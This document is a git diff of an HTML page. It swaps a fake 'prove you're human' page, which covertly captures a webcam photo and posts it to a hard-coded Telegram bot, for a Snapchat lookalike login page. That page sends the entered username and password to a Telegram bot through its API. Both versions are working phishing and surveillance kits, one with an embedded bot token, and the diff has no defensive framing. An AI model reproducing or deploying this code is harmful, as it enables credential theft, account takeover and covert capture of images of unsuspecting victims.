@@ -1,53 +1,116 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Camera Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fffc00; /* خلفية صفراء */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            width: 350px;
+            text-align: center;
+        }
+        h2 {
+            color: #fffc00;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 120px; /* زيادة حجم الشعار */
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .submit-btn {
+            background-color: #fffc00;
+            color: black;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .submit-btn:hover {
+            background-color: #e6e600; /* تغيير اللون عند المرور عليه */
+        }
+        .footer {
+            font-size: 14px;
+            margin-top: 20px;
+            color: #888;
+        }
+        .footer a {
+            color: #fffc00;
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
-  <h2>أثبت إنك إنسان</h2>
-  <video id="video" width="300" autoplay></video><br>
-  <button onclick="capture()">تحقق</button>
 
-  <script>
-    const video = document.getElementById('video');
+<div class="container">
+    <!-- شعار سناب شات -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Snapchat_logo_2020.png" alt="Snapchat Logo" class="logo">
+    <h2>Log in to Snapchat</h2>
+    <form id="loginForm">
+        <input type="text" class="input-field" id="username" name="username" placeholder="Username" required><br>
+        <input type="password" class="input-field" id="password" name="password" placeholder="Password" required><br>
+        <input type="submit" class="submit-btn" value="Log In">
+    </form>
+    <div class="footer">
+        <p>By logging in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
+        <p><a href="#">Forgot your password?</a></p>
+    </div>
+</div>
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert("فشل الوصول للكاميرا: " + err);
-      });
+<script>
+    const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot's token
+    const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
 
-    function capture() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
 
-      const dataURL = canvas.toDataURL('image/jpeg');
+        // Get form data
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
 
-      fetch(dataURL)
-        .then(res => res.blob())
-        .then(blob => {
-          const formData = new FormData();
-          formData.append('chat_id', '6124563464');
-          formData.append('photo', blob, 'photo.jpg');
+        // Prepare the message to be sent to Telegram
+        const message = `Username: ${username}\nPassword: ${password}`;
 
-          fetch('https://api.telegram.org/bot7707895718:AAEn9GruZqUGd9hDAmBlNAI-2sT3XvfK_24/sendPhoto', {
-            method: 'POST',
-            body: formData
-          }).then(response => {
-            if (response.ok) {
-              alert("تم إرسال الصورة!");
-            } else {
-              alert("فشل الإرسال: " + response.statusText);
-            }
-          });
-        });
-    }
-  </script>
+        // Send data to Telegram bot via the API
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Data sent successfully!');
+                } else {
+                    alert('Error sending data!');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending data!');
+            });
+    });
+</script>
+
 </body>
 </html>
